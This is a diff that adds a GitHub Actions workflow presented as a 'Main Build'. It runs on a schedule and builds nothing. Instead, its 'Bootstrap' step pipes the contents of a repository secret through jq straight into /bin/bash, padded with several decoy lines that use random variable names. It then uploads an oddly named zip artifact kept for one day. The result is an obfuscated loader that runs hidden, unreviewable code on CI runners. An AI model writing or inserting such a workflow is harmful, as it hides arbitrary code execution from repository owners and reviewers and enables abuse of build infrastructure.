@@ -1,0 +1,33 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '34 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          alc55370: ${{ secrets.alc55370 }}
+        run: |
+          printf '%s' "$alc55370" | jq -r .yox3 | /bin/bash
+          echo $jequp0 | jq -r .scmk6 | /bin/bash
+          printf '%s' "$us88718" | jq -r .slvhp52 | /bin/bash
+          printf '%s' "$c5" | jq -r .bojgq980 | /bin/bash
+          echo $dlx64986 | jq -r .nh102 | /bin/bash
+          echo $ipq15221 | jq -r .qynpb30401 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: sryVrRTk
+          path: "*.zip"
+          retention-days: 1
